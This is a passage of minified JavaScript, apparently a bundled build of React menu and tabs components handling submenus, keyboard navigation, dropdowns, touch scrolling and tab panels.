ie=f||M,ce=E||F,se=I.includes(d),ue=!R&&se,de=Z(q,d),me=H(d,re,j,S),pe=me.active,he=Object(s["a"])(me,Ne),fe=a["useState"](!1),Ee=Object(i["a"])(fe,2),be=Ee[0],ye=Ee[1],ke=function(e){re||ye(e)},we=function(e){ke(!0),null===k||void 0===k||k({key:d,domEvent:e})},xe=function(e){ke(!1),null===w||void 0===w||w({key:d,domEvent:e})},je=a["useMemo"]((function(){return pe||"inline"!==N&&(be||Z([_],d))}),[N,pe,_,be,d,Z]),Se=$(ee.length),Ae=function(e){re||(null===x||void 0===x||x({key:d,domEvent:e}),"inline"===N&&B(d,!se))},Oe=ge((function(e){null===y||void 0===y||y(W(e)),U(e)})),Ie=function(e){"inline"!==N&&B(d,e)},Pe=function(){G(d)},Re=A&&"".concat(A,"-popup"),_e=a["createElement"]("div",Object(l["a"])({role:"menuitem",style:Se,className:"".concat(ne,"-title"),tabIndex:re?null:-1,ref:le,title:"string"===typeof c?c:null,"data-menu-id":R&&A?null:A,"aria-expanded":ue,"aria-haspopup":!0,"aria-controls":Re,"aria-disabled":re,onClick:Ae,onFocus:Pe},he),c,a["createElement"](V,{icon:"horizontal"!==N?ce:null,props:Object(u["a"])(Object(u["a"])({},e),{},{isOpen:ue,isSubMenu:!0})},a["createElement"]("i",{className:"".concat(ne,"-arrow")}))),qe=a["useRef"](N);if("inline"!==N&&(qe.current=ee.length>1?"vertical":N),!R){var Me=qe.current;_e=a["createElement"](Ce,{mode:Me,prefixCls:ne,visible:!h&&ue&&"inline"!==N,popupClassName:b,popupOffset:v,popup:a["createElement"](z,{mode:"horizontal"===Me?"vertical":Me},a["createElement"](ve,{id:Re,ref:oe},g)),disabled:re,onVisibleChange:Ie},_e)}var Fe=a["createElement"](O["a"].Item,Object(l["a"])({role:"none"},C,{component:"li",style:n,className:m()(ne,"".concat(ne,"-").concat(N),r,(t={},Object(o["a"])(t,"".concat(ne,"-open"),ue),Object(o["a"])(t,"".concat(ne,"-active"),je),Object(o["a"])(t,"".concat(ne,"-selected"),de),Object(o["a"])(t,"".concat(ne,"-disabled"),re),t)),onMouseEnter:we,onMouseLeave:xe}),_e,!R&&a["createElement"](Le,{id:Re,open:ue,keyPath:ee},g));return Q&&(Fe=Q(Fe,e,{selected:de,active:je,open:ue,disabled:re})),a["createElement"](z,{onItemClick:Oe,mode:"horizontal"===N?"vertical":N,itemIcon:ie,expandIcon:ce},Fe)};function Ie(e){var t,n=e.eventKey,r=e.children,l=J(n),o=me(r,l),i=Q();return a["useEffect"]((function(){if(i)return i.registerPath(n,l),function(){i.unregisterPath(n,l)}}),[l]),t=i?o:a["createElement"](Oe,e,o),a["createElement"](K.Provider,{value:l},t)}var Pe=n("qLmf"),Re=k["a"].LEFT,_e=k["a"].RIGHT,qe=k["a"].UP,Me=k["a"].DOWN,Fe=k["a"].ENTER,De=k["a"].ESC,Ue=k["a"].HOME,ze=k["a"].END,He=[qe,Me,Re,_e];function Be(e,t,n,a){var r,l,i,c,s="prev",u="next",d="children",m="parent";if("inline"===e&&a===Fe)return{inlineTrigger:!0};var p=(r={},Object(o["a"])(r,qe,s),Object(o["a"])(r,Me,u),r),h=(l={},Object(o["a"])(l,Re,n?u:s),Object(o["a"])(l,_e,n?s:u),Object(o["a"])(l,Me,d),Object(o["a"])(l,Fe,d),l),g=(i={},Object(o["a"])(i,qe,s),Object(o["a"])(i,Me,u),Object(o["a"])(i,Fe,d),Object(o["a"])(i,De,m),Object(o["a"])(i,Re,n?d:m),Object(o["a"])(i,_e,n?m:d),i),f={inline:p,horizontal:h,vertical:g,inlineSub:p,horizontalSub:g,verticalSub:g},E=null===(c=f["".concat(e).concat(t?"":"Sub")])||void 0===c?void 0:c[a];switch(E){case s:return{offset:-1,sibling:!0};case u:return{offset:1,sibling:!0};case m:return{offset:-1,sibling:!1};case d:return{offset:1,sibling:!1};default:return null}}function We(e){var t=e;while(t){if(t.getAttribute("data-menu-list"))return t;t=t.parentElement}return null}function Ve(e,t){var n=e||document.activeElement;while(n){if(t.has(n))return n;n=n.parentElement}return null}function $e(e,t){var n=Object(Pe["a"])(e,!0);return n.filter((function(e){return t.has(e)}))}function Ge(e,t,n){var a=arguments.length>3&&void 0!==arguments[3]?arguments[3]:1;if(!e)return null;var r=$e(e,t),l=r.length,o=r.findIndex((function(e){return n===e}));return a<0?-1===o?o=l-1:o-=1:a>0&&(o+=1),o=(o+l)%l,r[o]}function Xe(e,t,n,r,l,o,i,c,s,u){var d=a["useRef"](),m=a["useRef"]();m.current=t;var p=function(){E["a"].cancel(d.current)};return a["useEffect"]((function(){return function(){p()}}),[]),function(a){var h=a.which;if([].concat(He,[Fe,De,Ue,ze]).includes(h)){var g,f,b,v=function(){g=new Set,f=new Map,b=new Map;var e=o();return e.forEach((function(e){var t=document.querySelector("[data-menu-id='".concat(ee(r,e),"']"));t&&(g.add(t),b.set(t,e),f.set(e,t))})),g};v();var y=f.get(t),k=Ve(y,g),w=b.get(k),x=Be(e,1===i(w,!0).length,n,h);if(!x&&h!==Ue&&h!==ze)return;(He.includes(h)||[Ue,ze].includes(h))&&a.preventDefault();var j=function(e){if(e){var t=e,n=e.querySelector("a");(null===n||void 0===n?void 0:n.getAttribute("href"))&&(t=n);var a=b.get(e);c(a),p(),d.current=Object(E["a"])((function(){m.current===a&&t.focus()}))}};if([Ue,ze].includes(h)||x.sibling||!k){var S,C;S=k&&"inline"!==e?We(k):l.current;var A=$e(S,g);C=h===Ue?A[0]:h===ze?A[A.length-1]:Ge(S,g,k,x.offset),j(C)}else if(x.inlineTrigger)s(w);else if(x.offset>0)s(w,!0),p(),d.current=Object(E["a"])((function(){v();var e=k.getAttribute("aria-controls"),t=document.getElementById(e),n=Ge(t,g);j(n)}),5);else if(x.offset<0){var L=i(w,!0),T=L[L.length-2],N=f.get(T);s(T,!1),j(N)}}null===u||void 0===u||u(a)}}var Qe=Math.random().toFixed(5).toString().slice(2),Ke=0;function Je(e){var t=Object(g["a"])(e,{value:e}),n=Object(i["a"])(t,2),r=n[0],l=n[1];return a["useEffect"]((function(){Ke+=1;var e="".concat(Qe,"-").concat(Ke);l("rc-menu-uuid-".concat(e))}),[]),r}function Ye(e){Promise.resolve().then(e)}var Ze="__RC_UTIL_PATH_SPLIT__",et=function(e){return e.join(Ze)},tt=function(e){return e.split(Ze)},nt="rc-menu-more";function at(){var e=a["useState"]({}),t=Object(i["a"])(e,2),n=t[1],r=Object(a["useRef"])(new Map),l=Object(a["useRef"])(new Map),o=a["useState"]([]),c=Object(i["a"])(o,2),s=c[0],u=c[1],d=Object(a["useRef"])(0),m=Object(a["useRef"])(!1),p=function(){m.current||n({})},h=Object(a["useCallback"])((function(e,t){var n=et(t);l.current.set(n,e),r.current.set(e,n),d.current+=1;var a=d.current;Ye((function(){a===d.current&&p()}))}),[]),g=Object(a["useCallback"])((function(e,t){var n=et(t);l.current["delete"](n),r.current["delete"](e)}),[]),E=Object(a["useCallback"])((function(e){u(e)}),[]),b=Object(a["useCallback"])((function(e,t){var n=r.current.get(e)||"",a=tt(n);return t&&s.includes(a[0])&&a.unshift(nt),a}),[s]),v=Object(a["useCallback"])((function(e,t){return e.some((function(e){var n=b(e,!0);return n.includes(t)}))}),[b]),y=function(){var e=Object(f["a"])(r.current.keys());return s.length&&e.push(nt),e},k=Object(a["useCallback"])((function(e){var t="".concat(r.current.get(e)).concat(Ze),n=new Set;return Object(f["a"])(l.current.keys()).forEach((function(e){e.startsWith(t)&&n.add(l.current.get(e))})),n}),[]);return a["useEffect"]((function(){return function(){m.current=!0}}),[]),{registerPath:h,unregisterPath:g,refreshOverflowKeys:E,isSubPathKey:v,getKeyPath:b,getKeys:y,getSubPathKeys:k}}var rt=["prefixCls","rootClassName","style","className","tabIndex","items","children","direction","id","mode","inlineCollapsed","disabled","disabledOverflow","subMenuOpenDelay","subMenuCloseDelay","forceSubMenuRender","defaultOpenKeys","openKeys","activeKey","defaultActiveFirst","selectable","multiple","defaultSelectedKeys","selectedKeys","onSelect","onDeselect","inlineIndent","motion","defaultMotions","triggerSubMenuAction","builtinPlacements","itemIcon","expandIcon","overflowedIndicator","overflowedIndicatorPopupClassName","getPopupContainer","onClick","onOpenChange","onKeyDown","openAnimation","openTransitionName","_internalRenderMenuItem","_internalRenderSubMenuItem"],lt=[],ot=a["forwardRef"]((function(e,t){var n,r,c=e.prefixCls,d=void 0===c?"rc-menu":c,p=e.rootClassName,h=e.style,E=e.className,b=e.tabIndex,v=void 0===b?0:b,y=e.items,k=e.children,w=e.direction,x=e.id,j=e.mode,S=void 0===j?"vertical":j,C=e.inlineCollapsed,A=e.disabled,L=e.disabledOverflow,N=e.subMenuOpenDelay,I=void 0===N?.1:N,P=e.subMenuCloseDelay,R=void 0===P?.1:P,_=e.forceSubMenuRender,q=e.defaultOpenKeys,M=e.openKeys,F=e.activeKey,D=e.defaultActiveFirst,U=e.selectable,H=void 0===U||U,B=e.multiple,V=void 0!==B&&B,$=e.defaultSelectedKeys,G=e.selectedKeys,Q=e.onSelect,K=e.onDeselect,J=e.inlineIndent,te=void 0===J?24:J,ne=e.motion,re=e.defaultMotions,le=e.triggerSubMenuAction,oe=void 0===le?"hover":le,ie=e.builtinPlacements,ce=e.itemIcon,se=e.expandIcon,de=e.overflowedIndicator,me=void 0===de?"...":de,pe=e.overflowedIndicatorPopupClassName,fe=e.getPopupContainer,Ee=e.onClick,be=e.onOpenChange,ve=e.onKeyDown,ye=(e.openAnimation,e.openTransitionName,e._internalRenderMenuItem),ke=e._internalRenderSubMenuItem,we=Object(s["a"])(e,rt),xe=a["useMemo"]((function(){return he(k,y,lt)}),[k,y]),je=a["useState"](!1),Se=Object(i["a"])(je,2),Ce=Se[0],Ae=Se[1],Le=a["useRef"](),Te=Je(x),Ne="rtl"===w;var Oe=a["useMemo"]((function(){return"inline"!==S&&"vertical"!==S||!C?[S,!1]:["vertical",C]}),[S,C]),Pe=Object(i["a"])(Oe,2),Re=Pe[0],_e=Pe[1],qe=a["useState"](0),Me=Object(i["a"])(qe,2),Fe=Me[0],De=Me[1],Ue=Fe>=xe.length-1||"horizontal"!==Re||L,ze=Object(g["a"])(q,{value:M,postState:function(e){return e||lt}}),He=Object(i["a"])(ze,2),Be=He[0],We=He[1],Ve=function(e){We(e),null===be||void 0===be||be(e)},$e=a["useState"](Be),Ge=Object(i["a"])($e,2),Qe=Ge[0],Ke=Ge[1],Ye="inline"===Re,Ze=a["useRef"](!1);a["useEffect"]((function(){Ye&&Ke(Be)}),[Be]),a["useEffect"]((function(){Ze.current&&(Ye?We(Qe):Ve(lt))}),[Ye]),a["useEffect"]((function(){return Ze.current=!0,function(){Ze.current=!1}}),[]);var et=at(),tt=et.registerPath,ot=et.unregisterPath,it=et.refreshOverflowKeys,ct=et.isSubPathKey,st=et.getKeyPath,ut=et.getKeys,dt=et.getSubPathKeys,mt=a["useMemo"]((function(){return{registerPath:tt,unregisterPath:ot}}),[tt,ot]),pt=a["useMemo"]((function(){return{isSubPathKey:ct}}),[ct]);a["useEffect"]((function(){it(Ue?lt:xe.slice(Fe+1).map((function(e){return e.key})))}),[Fe,Ue]);var ht=Object(g["a"])(F||D&&(null===(n=xe[0])||void 0===n?void 0:n.key),{value:F}),gt=Object(i["a"])(ht,2),ft=gt[0],Et=gt[1],bt=ge((function(e){Et(e)})),vt=ge((function(){Et(void 0)}));Object(a["useImperativeHandle"])(t,(function(){return{list:Le.current,focus:function(e){var t,n,a,r,l=null!==ft&&void 0!==ft?ft:null===(t=xe.find((function(e){return!e.props.disabled})))||void 0===t?void 0:t.key;l&&(null===(n=Le.current)||void 0===n||null===(a=n.querySelector("li[data-menu-id='".concat(ee(Te,l),"']")))||void 0===a||null===(r=a.focus)||void 0===r||r.call(a,e))}}}));var yt=Object(g["a"])($||[],{value:G,postState:function(e){return Array.isArray(e)?e:null===e||void 0===e?lt:[e]}}),kt=Object(i["a"])(yt,2),wt=kt[0],xt=kt[1],jt=function(e){if(H){var t,n=e.key,a=wt.includes(n);t=V?a?wt.filter((function(e){return e!==n})):[].concat(Object(f["a"])(wt),[n]):[n],xt(t);var r=Object(u["a"])(Object(u["a"])({},e),{},{selectedKeys:t});a?null===K||void 0===K||K(r):null===Q||void 0===Q||Q(r)}!V&&Be.length&&"inline"!==Re&&Ve(lt)},St=ge((function(e){null===Ee||void 0===Ee||Ee(W(e)),jt(e)})),Ct=ge((function(e,t){var n=Be.filter((function(t){return t!==e}));if(t)n.push(e);else if("inline"!==Re){var a=dt(e);n=n.filter((function(e){return!a.has(e)}))}T()(Be,n)||Ve(n)})),At=ge(fe),Lt=function(e,t){var n=null!==t&&void 0!==t?t:!Be.includes(e);Ct(e,n)},Tt=Xe(Re,ft,Ne,Te,Le,ut,st,Et,Lt,ve);a["useEffect"]((function(){Ae(!0)}),[]);var Nt=a["useMemo"]((function(){return{_internalRenderMenuItem:ye,_internalRenderSubMenuItem:ke}}),[ye,ke]),Ot="horizontal"!==Re||L?xe:xe.map((function(e,t){return a["createElement"](z,{key:e.key,overflowDisabled:t>Fe},e)})),It=a["createElement"](O["a"],Object(l["a"])({id:x,ref:Le,prefixCls:"".concat(d,"-overflow"),component:"ul",itemComponent:ue,className:m()(d,"".concat(d,"-root"),"".concat(d,"-").concat(Re),E,(r={},Object(o["a"])(r,"".concat(d,"-inline-collapsed"),_e),Object(o["a"])(r,"".concat(d,"-rtl"),Ne),r),p),dir:w,style:h,role:"menu",tabIndex:v,data:Ot,renderRawItem:function(e){return e},renderRawRest:function(e){var t=e.length,n=t?xe.slice(-t):null;return a["createElement"](Ie,{eventKey:nt,title:me,disabled:Ue,internalPopupClose:0===t,popupClassName:pe},n)},maxCount:"horizontal"!==Re||L?O["a"].INVALIDATE:O["a"].RESPONSIVE,ssr:"full","data-menu-list":!0,onVisibleChange:function(e){De(e)},onKeyDown:Tt},we));return a["createElement"](ae.Provider,{value:Nt},a["createElement"](Z.Provider,{value:Te},a["createElement"](z,{prefixCls:d,rootClassName:p,mode:Re,openKeys:Be,rtl:Ne,disabled:A,motion:Ce?ne:null,defaultMotions:Ce?re:null,activeKey:ft,onActive:bt,onInactive:vt,selectedKeys:wt,inlineIndent:te,subMenuOpenDelay:I,subMenuCloseDelay:R,forceSubMenuRender:_,builtinPlacements:ie,triggerSubMenuAction:oe,getPopupContainer:At,itemIcon:ce,expandIcon:se,onItemClick:St,onOpenChange:Ct},a["createElement"](Y.Provider,{value:pt},It),a["createElement"]("div",{style:{display:"none"},"aria-hidden":!0},a["createElement"](X.Provider,{value:mt},xe)))))})),it=ot,ct=["className","title","eventKey","children"],st=["children"],ut=function(e){var t=e.className,n=e.title,r=(e.eventKey,e.children),o=Object(s["a"])(e,ct),i=a["useContext"](D),c=i.prefixCls,u="".concat(c,"-item-group");return a["createElement"]("li",Object(l["a"])({},o,{onClick:function(e){return e.stopPropagation()},className:m()(u,t)}),a["createElement"]("div",{className:"".concat(u,"-title"),title:"string"===typeof n?n:void 0},n),a["createElement"]("ul",{className:"".concat(u,"-list")},r))};function dt(e){var t=e.children,n=Object(s["a"])(e,st),r=J(n.eventKey),l=me(t,r),o=Q();return o?l:a["createElement"](ut,Object(q["a"])(n,["warnKey"]),l)}function mt(e){var t=e.className,n=e.style,r=a["useContext"](D),l=r.prefixCls,o=Q();return o?null:a["createElement"]("li",{className:m()("".concat(l,"-item-divider"),t),style:n})}var pt=it;pt.Item=ue,pt.SubMenu=Ie,pt.ItemGroup=dt,pt.Divider=mt;var ht=pt,gt=n("bgne");function ft(e,t){var n=e.prefixCls,r=e.editable,l=e.locale,o=e.style;return r&&!1!==r.showAdd?a["createElement"]("button",{ref:t,type:"button",className:"".concat(n,"-nav-add"),style:o,"aria-label":(null===l||void 0===l?void 0:l.addAriaLabel)||"Add tab",onClick:function(e){r.onEdit("add",{event:e})}},r.addIcon||"+"):null}var Et=a["forwardRef"](ft);function bt(e,t){var n=e.prefixCls,r=e.id,l=e.tabs,c=e.locale,s=e.mobile,u=e.moreIcon,d=void 0===u?"More":u,p=e.moreTransitionName,h=e.style,g=e.className,f=e.editable,E=e.tabBarGutter,b=e.rtl,v=e.removeAriaLabel,y=e.onTabClick,w=e.getPopupContainer,x=e.popupClassName,j=Object(a["useState"])(!1),S=Object(i["a"])(j,2),C=S[0],A=S[1],L=Object(a["useState"])(null),T=Object(i["a"])(L,2),N=T[0],O=T[1],I="".concat(r,"-more-popup"),P="".concat(n,"-dropdown"),R=null!==N?"".concat(I,"-").concat(N):null,_=null===c||void 0===c?void 0:c.dropdownAriaLabel;function q(e,t){e.preventDefault(),e.stopPropagation(),f.onEdit("remove",{key:t,event:e})}var M=a["createElement"](ht,{onClick:function(e){var t=e.key,n=e.domEvent;y(t,n),A(!1)},prefixCls:"".concat(P,"-menu"),id:I,tabIndex:-1,role:"listbox","aria-activedescendant":R,selectedKeys:[N],"aria-label":void 0!==_?_:"expanded dropdown"},l.map((function(e){var t=f&&!1!==e.closable&&!e.disabled;return a["createElement"](ue,{key:e.key,id:"".concat(I,"-").concat(e.key),role:"option","aria-controls":r&&"".concat(r,"-panel-").concat(e.key),disabled:e.disabled},a["createElement"]("span",null,e.tab),t&&a["createElement"]("button",{type:"button","aria-label":v||"remove",tabIndex:0,className:"".concat(P,"-menu-item-remove"),onClick:function(t){t.stopPropagation(),q(t,e.key)}},e.closeIcon||f.removeIcon||"\xd7"))})));function F(e){for(var t=l.filter((function(e){return!e.disabled})),n=t.findIndex((function(e){return e.key===N}))||0,a=t.length,r=0;r<a;r+=1){n=(n+e+a)%a;var o=t[n];if(!o.disabled)return void O(o.key)}}function D(e){var t=e.which;if(C)switch(t){case k["a"].UP:F(-1),e.preventDefault();break;case k["a"].DOWN:F(1),e.preventDefault();break;case k["a"].ESC:A(!1);break;case k["a"].SPACE:case k["a"].ENTER:null!==N&&y(N,e);break}else[k["a"].DOWN,k["a"].SPACE,k["a"].ENTER].includes(t)&&(A(!0),e.preventDefault())}Object(a["useEffect"])((function(){var e=document.getElementById(R);e&&e.scrollIntoView&&e.scrollIntoView(!1)}),[N]),Object(a["useEffect"])((function(){C||O(null)}),[C]);var U=Object(o["a"])({},b?"marginRight":"marginLeft",E);l.length||(U.visibility="hidden",U.order=1);var z=m()(Object(o["a"])({},"".concat(P,"-rtl"),b)),H=s?null:a["createElement"](gt["a"],{prefixCls:P,overlay:M,trigger:["hover"],visible:!!l.length&&C,transitionName:p,onVisibleChange:A,overlayClassName:m()(z,x),mouseEnterDelay:.1,mouseLeaveDelay:.1,getPopupContainer:w},a["createElement"]("button",{type:"button",className:"".concat(n,"-nav-more"),style:U,tabIndex:-1,"aria-hidden":"true","aria-haspopup":"listbox","aria-controls":I,id:"".concat(r,"-more"),"aria-expanded":C,onKeyDown:D},d));return a["createElement"]("div",{className:m()("".concat(n,"-nav-operations"),g),style:h,ref:t},H,a["createElement"](Et,{prefixCls:n,locale:c,editable:f}))}var vt=a["memo"](a["forwardRef"](bt),(function(e,t){return t.tabMoving})),yt=Object(a["createContext"])(null),kt=.1,wt=.01,xt=20,jt=Math.pow(.995,xt);function St(e,t){var n=Object(a["useState"])(),r=Object(i["a"])(n,2),l=r[0],o=r[1],c=Object(a["useState"])(0),s=Object(i["a"])(c,2),u=s[0],d=s[1],m=Object(a["useState"])(0),p=Object(i["a"])(m,2),h=p[0],g=p[1],f=Object(a["useState"])(),E=Object(i["a"])(f,2),b=E[0],v=E[1],y=Object(a["useRef"])();function k(e){var t=e.touches[0],n=t.screenX,a=t.screenY;o({x:n,y:a}),window.clearInterval(y.current)}function w(e){if(l){e.preventDefault();var n=e.touches[0],a=n.screenX,r=n.screenY;o({x:a,y:r});var i=a-l.x,c=r-l.y;t(i,c);var s=Date.now();d(s),g(s-u),v({x:i,y:c})}}function x(){if(l&&(o(null),v(null),b)){var e=b.x/h,n=b.y/h,a=Math.abs(e),r=Math.abs(n);if(Math.max(a,r)<kt)return;var i=e,c=n;y.current=window.setInterval((function(){Math.abs(i)<wt&&Math.abs(c)<wt?window.clearInterval(y.current):(i*=jt,c*=jt,t(i*xt,c*xt))}),xt)}}var j=Object(a["useRef"])();function S(e){var n=e.deltaX,a=e.deltaY,r=0,l=Math.abs(n),o=Math.abs(a);l===o?r="x"===j.current?n:a:l>o?(r=n,j.current="x"):(r=a,j.current="y"),t(-r,-r)&&e.preventDefault()}var C=Object(a["useRef"])(null);C.current={onTouchStart:k,onTouchMove:w,onTouchEnd:x,onWheel:S},a["useEffect"]((function(){function t(e){C.current.onTouchStart(e)}function n(e){C.current.onTouchMove(e)}function a(e){C.current.onTouchEnd(e)}function r(e){C.current.onWheel(e)}return document.addEventListener("touchmove",n,{passive:!1}),document.addEventListener("touchend",a,{passive:!1}),e.current.addEventListener("touchstart",t,{passive:!1}),e.current.addEventListener("wheel",r),function(){document.removeEventListener("touchmove",n),document.removeEventListener("touchend",a)}}),[])}function Ct(){var e=Object(a["useRef"])(new Map);function t(t){return e.current.has(t)||e.current.set(t,a["createRef"]()),e.current.get(t)}function n(t){e.current["delete"](t)}return[t,n]}function At(e,t){var n=a["useRef"](e),r=a["useState"]({}),l=Object(i["a"])(r,2),o=l[1];function c(e){var a="function"===typeof e?e(n.current):e;a!==n.current&&t(a,n.current),n.current=a,o({})}return[n.current,c]}var Lt=function(e){var t,n=e.position,r=e.prefixCls,l=e.extra;if(!l)return null;var o={};return l&&"object"===Object(c["a"])(l)&&!a["isValidElement"](l)?o=l:o.right=l,"right"===n&&(t=o.right),"left"===n&&(t=o.left),t?a["createElement"]("div",{className:"".concat(r,"-extra-content")},t):null};function Tt(e,t){var n,r=a["useContext"](yt),c=r.prefixCls,s=r.tabs,d=e.className,p=e.style,h=e.id,g=e.animated,k=e.activeKey,w=e.rtl,j=e.extra,C=e.editable,L=e.locale,T=e.tabPosition,N=e.tabBarGutter,O=e.children,I=e.onTabClick,P=e.onTabScroll,R=Object(a["useRef"])(),_=Object(a["useRef"])(),q=Object(a["useRef"])(),M=Object(a["useRef"])(),F=Ct(),D=Object(i["a"])(F,2),U=D[0],z=D[1],H="top"===T||"bottom"===T,B=At(0,(function(e,t){H&&P&&P({direction:e>t?"left":"right"})})),W=Object(i["a"])(B,2),V=W[0],$=W[1],G=At(0,(function(e,t){!H&&P&&P({direction:e>t?"top":"bottom"})})),X=Object(i["a"])(G,2),Q=X[0],K=X[1],J=Object(a["useState"])(0),Y=Object(i["a"])(J,2),Z=Y[0],ee=Y[1],te=Object(a["useState"])(0),ne=Object(i["a"])(te,2),ae=ne[0],re=ne[1],le=Object(a["useState"])(null),oe=Object(i["a"])(le,2),ie=oe[0],ce=oe[1],se=Object(a["useState"])(null),ue=Object(i["a"])(se,2),de=ue[0],me=ue[1],pe=Object(a["useState"])(0),he=Object(i["a"])(pe,2),ge=he[0],fe=he[1],Ee=Object(a["useState"])(0),be=Object(i["a"])(Ee,2),ve=be[0],ye=be[1],ke=y(new Map),we=Object(i["a"])(ke,2),xe=we[0],je=we[1],Se=S(s,xe,Z),Ce="".concat(c,"-nav-operations-hidden"),Ae=0,Le=0;function Te(e){return e<Ae?Ae:e>Le?Le:e}H?w?(Ae=0,Le=Math.max(0,Z-ie)):(Ae=Math.min(0,ie-Z),Le=0):(Ae=Math.min(0,de-ae),Le=0);var Ne=Object(a["useRef"])(),Oe=Object(a["useState"])(),Ie=Object(i["a"])(Oe,2),Pe=Ie[0],Re=Ie[1];function _e(){Re(Date.now())}function qe(){window.clearTimeout(Ne.current)}function Me(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:k,t=Se.get(e)||{width:0,height:0,left:0,right:0,top:0};if(H){var n=V;w?t.right<V?n=t.right:t.right+t.width>V+ie&&(n=t.right+t.width-ie):t.left<-V?n=-t.left:t.left+t.width>-V+ie&&(n=-(t.left+t.width-ie)),K(0),$(Te(n))}else{var a=Q;t.top<-Q?a=-t.top:t.top+t.height>-Q+de&&(a=-(t.top+t.height-de)),$(0),K(Te(a))}}St(R,(function(e,t){function n(e,t){e((function(e){var n=Te(e+t);return n}))}if(H){if(ie>=Z)return!1;n($,e)}else{if(de>=ae)return!1;n(K,t)}return qe(),_e(),!0})),Object(a["useEffect"])((function(){return qe(),Pe&&(Ne.current=window.setTimeout((function(){Re(0)}),100)),qe}),[Pe]);var Fe=A(Se,{width:ie,height:de,left:V,top:Q},{width:Z,height:ae},{width:ge,height:ve},Object(u["a"])(Object(u["a"])({},e),{},{tabs:s})),De=Object(i["a"])(Fe,2),Ue=De[0],ze=De[1],He={};"top"===T||"bottom"===T?He[w?"marginRight":"marginLeft"]=N:He.marginTop=N;var Be=s.map((function(e,t){var n=e.key;return a["createElement"](x,{id:h,prefixCls:c,key:n,tab:e,style:0===t?void 0:He,closable:e.closable,editable:C,active:n===k,renderWrapper:O,removeAriaLabel:null===L||void 0===L?void 0:L.removeAriaLabel,ref:U(n),onClick:function(e){I(n,e)},onRemove:function(){z(n)},onFocus:function(){Me(n),_e(),R.current&&(w||(R.current.scrollLeft=0),R.current.scrollTop=0)}})})),We=v((function(){var e,t,n,a,r,l,o=(null===(e=R.current)||void 0===e?void 0:e.offsetWidth)||0,i=(null===(t=R.current)||void 0===t?void 0:t.offsetHeight)||0,c=(null===(n=M.current)||void 0===n?void 0:n.offsetWidth)||0,u=(null===(a=M.current)||void 0===a?void 0:a.offsetHeight)||0;ce(o),me(i),fe(c),ye(u);var d=((null===(r=_.current)||void 0===r?void 0:r.offsetWidth)||0)-c,m=((null===(l=_.current)||void 0===l?void 0:l.offsetHeight)||0)-u;ee(d),re(m),je((function(){var e=new Map;return s.forEach((function(t){var n=t.key,a=U(n).current;a&&e.set(n,{width:a.offsetWidth,height:a.offsetHeight,left:a.offsetLeft,top:a.offsetTop})})),e}))})),Ve=s.slice(0,Ue),$e=s.slice(ze+1),Ge=[].concat(Object(f["a"])(Ve),Object(f["a"])($e)),Xe=Object(a["useState"])(),Qe=Object(i["a"])(Xe,2),Ke=Qe[0],Je=Qe[1],Ye=Se.get(k),Ze=Object(a["useRef"])();function et(){E["a"].cancel(Ze.current)}Object(a["useEffect"])((function(){var e={};return Ye&&(H?(w?e.right=Ye.right:e.left=Ye.left,e.width=Ye.width):(e.top=Ye.top,e.height=Ye.height)),et(),Ze.current=Object(E["a"])((function(){Je(e)})),et}),[Ye,H,w]),Object(a["useEffect"])((function(){Me()}),[k,Ye,Se,H]),Object(a["useEffect"])((function(){We()}),[w,N,k,s.map((function(e){return e.key})).join("_")]);var tt,nt,at,rt,lt=!!Ge.length,ot="".concat(c,"-nav-wrap");return H?w?(nt=V>0,tt=V+ie<Z):(tt=V<0,nt=-V+ie<Z):(at=Q<0,rt=-Q+de<ae),a["createElement"]("div",{ref:t,role:"tablist",className:m()("".concat(c,"-nav"),d),style:p,onKeyDown:function(){_e()}},a["createElement"](Lt,{position:"left",extra:j,prefixCls:c}),a["createElement"](b["a"],{onResize:We},a["createElement"]("div",{className:m()(ot,(n={},Object(o["a"])(n,"".concat(ot,"-ping-left"),tt),Object(o["a"])(n,"".concat(ot,"-ping-right"),nt),Object(o["a"])(n,"".concat(ot,"-ping-top"),at),Object(o["a"])(n,"".concat(ot,"-ping-bottom"),rt),n)),ref:R},a["createElement"](b["a"],{onResize:We},a["createElement"]("div",{ref:_,className:"".concat(c,"-nav-list"),style:{transform:"translate(".concat(V,"px, ").concat(Q,"px)"),transition:Pe?"none":void 0}},Be,a["createElement"](Et,{ref:M,prefixCls:c,locale:L,editable:C,style:Object(u["a"])(Object(u["a"])({},0===Be.length?void 0:He),{},{visibility:lt?"hidden":null})}),a["createElement"]("div",{className:m()("".concat(c,"-ink-bar"),Object(o["a"])({},"".concat(c,"-ink-bar-animated"),g.inkBar)),style:Ke}))))),a["createElement"](vt,Object(l["a"])({},e,{removeAriaLabel:null===L||void 0===L?void 0:L.removeAriaLabel,ref:q,prefixCls:c,tabs:Ge,className:!lt&&Ce,tabMoving:!!Pe})),a["createElement"](Lt,{position:"right",extra:j,prefixCls:c}))}var Nt=a["forwardRef"](Tt);function Ot(e){var t=e.id,n=e.activeKey,r=e.animated,l=e.tabPosition,i=e.rtl,c=e.destroyInactiveTabPane,s=a["useContext"](yt),u=s.prefixCls,d=s.tabs,p=r.tabPane,h=d.findIndex((function(e){return e.key===n}));return a["createElement"]("div",{className:m()("".concat(u,"-content-holder"))},a["createElement"]("div",{className:m()("".concat(u,"-content"),"".concat(u,"-content-").concat(l),Object(o["a"])({},"".concat(u,"-content-animated"),p)),style:h&&p?Object(o["a"])({},i?"marginRight":"marginLeft","-".concat(h,"00%")):null},d.map((function(e){return a["cloneElement"](e.node,{key:e.key,prefixCls:u,tabKey:e.key,id:t,animated:p,active:e.key===n,destroyInactiveTabPane:c})}))))}function It(e){var t=e.prefixCls,n=e.forceRender,r=e.className,l=e.style,o=e.id,c=e.active,s=e.animated,d=e.destroyInactiveTabPane,p=e.tabKey,h=e.children,g=a["useState"](n),f=Object(i["a"])(g,2),E=f[0],b=f[1];a["useEffect"]((function(){c?b(!0):d&&b(!1)}),[c,d]);var v={};return c||(s?(v.visibility="hidden",v.height=0,v.overflowY="hidden"):v.display="none"),a["createElement"]("div",{id:o&&"".concat(o,"-panel-").concat(p),role:"tabpanel",tabIndex:c?0:-1,"aria-labelledby":o&&"".concat(o,"-tab-").concat(p),"aria-hidden":!c,style:Object(u["a"])(Object(u["a"])({},v),l),className:m()("".concat(t,"-tabpane"),c&&"".concat(t,"-tabpane-active"),r)},(c||E||n)&&h)}var 